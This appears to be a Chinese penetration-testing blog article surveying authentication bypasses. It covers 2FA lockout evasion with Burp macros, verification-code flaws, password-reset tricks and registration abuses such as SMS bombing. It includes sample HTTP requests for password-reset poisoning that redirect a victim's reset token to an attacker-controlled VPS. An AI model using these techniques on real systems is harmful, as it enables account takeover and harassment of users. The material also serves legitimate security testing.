4.绕过cookie+次数验证的2FA验证码
这是在一个漏洞环境中发现的一个新的思路，觉得有意思就将其写
下来，当我们两次输入错误的安全口令后，我们所登录的帐号将会
进行注销，因此我们需要使用burp的宏功能绕过这种机制。
例如账号的登录逻辑为：
当 两 次 安 全 口 令 登 录 失 败 后 又 会 跳 转 到 GET /login
登录界面。我们针对这种情况可以开启宏功能对其自动登录。开启
宏操作如下：
点击add之后会自动弹出一个框：
由于我没有这个环境就只将其简单说一下，依次选中我们带有 GET
/login 、 POST /login 、 GET /login2
的URL，之后一路点击OK即可。
验证漏洞
（1）验证码不失效：找回密码判断时，仅判断验证码是否正确，没
有对验证码的过期时间进行限制。
（2）验证码未校验：输入手机号和验证码进行重置密码的时候，仅
对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做
验证。
（3）验证码可直接返回：发送验证码后，可以通过抓包等方式得到
正确的验证码，直接填写验证码跳转更改密码页面。
（4）可直接修改接收的手机或邮箱。
（5）本地验证可绕过：客户端在本地进行验证码是否正确的判断，
主要是根据接收到验证成功或验证失败的包判断是否验证成功，而
该判断结果也可以在本地修改，最终导致欺骗客户端，进入密码修
改界面。
（6）验证码易识别。
其他漏洞
1.重置密码：
（1）URL重置密码
一般是在找回密码的时候，会给指定邮箱发送一个用于校验的url链
接，链接中一般肯定会存在2个比较重要的参数，一个是用户名（或
者uid、qq邮箱之类的能代表用户身份的参数），另一个就是一个加
密的字符串（通过服务器端的某种算法生成的用来验证用户身份的
参数）。然后用户在重置密码的时候，点击邮箱中的重置密码链接
，就可以重置帐号密码了。这种设计产生重置密码漏洞的情况，一
般是由于重置密码链接中的表示用户名的参数和用于校验的加密字
符串参数没有进行一一对应，导致可以被黑客偷梁换柱，从而重置
密码。也就是说，那个验证身份的加密字符串是万能的。
找到重置密码并抓包后发现token是万能的：
将用户名修改为其他已知的用户并删除token：
最后转到登录页面会发现重置密码成功！
除此之外加密字符串还可能是加密算法过于简单而被破解，导致密
码重置。这种一般都是一些简单的加密算法，将一些关键参数比如
用户名、邮箱、手机号、验证字符、时间戳等，进行一定的规则的
组合然后进行md5、base64加密。
（2）毒化重置密码
这个是在burp实验室中看到的。当要进行重置密码时，用户通常会
输入其用户名或电子邮件地址，不久之后，他们会通过电子邮件收
到重设URL。如果此URL是动态生成的，则有时可能容易受到密码重
置中毒的攻击。简而言之就是我们输入用户名之后重置密码，通过
拦截其请求并将host标头修改为自己的VPS，当用户点击重置密码
的电子邮件地址后，自己的VPS日志中会出现带有动态token的重置
密码链接，将URL重新修改为原URL访问即可：
初始的请求如下：
POST /password-reset HTTP/1.1
Host:原host地址
...
account=受害者邮箱
攻击者可以将Host改为自己的VPS地址：
POST /password-reset HTTP/1.1
Host:攻击者VPS
...
account=受害者邮箱
受害者可能会收到如
下重置密码URL：
http://攻击者VPS/password-reset?token=xxxxxxxx
当受害者访问此URL之后便可在自己的VPS日志中到后面的token值
达到我们重置密码的目的。
（3）修改响应状态，绕过修改密码。
当返回包出现true\false、0\1等信息可以尝试进行修改，可能会
有出人意料的结果。曾经遇到过一个案例，当尝试修改返回包code
值时，将其从0到9进行遍历，当code值为7的时候不用找回密码便
直接登录了。。
（4）F12大法
有的重置密码可能会有以下步骤1.输入账户名2.验证身份3.重置密
码4.完成。当你进行了1之后，直接去修改URL或者前端代码去进行
3步骤从而也能成功的绕过了2的验证去重置密码。
（5）有时候修改密码的时候会给邮箱或者手机发送一个新密码，那
么抓包将手机号或者邮箱改成我们自己的可能会绕过其认证方式。
2.用户注册
（1）用户枚举
通过返回包中的信息判断用户是否注册。
（2）任意用户注册
没有对用户信息进行校验。
（3）XSS、SQL注入
（4）短信轰炸
这种在注册中比较常见，不断repeater即可，如果目标站增加了一
些防护，可以加一些换行符等特殊字符绕过。
（5）重复注册他人账号
当注册时显示用户已经注册了，我们可以在新用户注册的时候抓包
，更改用户信息，可能会覆盖原用户并重新注册。
总结
身份认证类问题其实更多的是逻辑问题，只要我们足够细心，在关
键地方进行尝试，说不定就可以得到意想不到的结果。现在在挖掘
中更多的是思路的寻找，而不仅仅局限于以上总结。有些漏洞也是
通用的，不仅仅出现在登录框等页面，比如在重置密码处说的修改
响应状态，完全可以在登录或者注册时套用。同时也要注意组合漏
洞的使用，漏洞之间的相互组合也能达到绕过身份认证的目的。
参考链接：
https://blog.csdn.net/chest_/article/details/103941792#%E7%94%A8
%E6%88%B7%E6%B3%A8%E5%86%8C
https://www.freebuf.com/articles/web/217052.html
https://www.secpulse.com/archives/136720.html
......
精选留言
用户设置不下载评论